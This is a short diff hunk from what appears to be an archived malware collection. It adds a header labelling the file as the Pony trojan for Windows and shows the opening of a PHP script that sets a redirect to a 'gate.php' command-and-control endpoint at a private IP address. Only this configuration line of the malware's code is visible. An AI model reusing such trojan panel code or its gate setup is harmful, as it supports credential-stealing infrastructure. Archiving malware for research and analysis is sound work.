@@ -1,3 +1,14 @@
+/*
+  name      Pony
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $redirect_url = "http://192.168.1.101/gate.php"; // redirect URL (should point to the gate script)
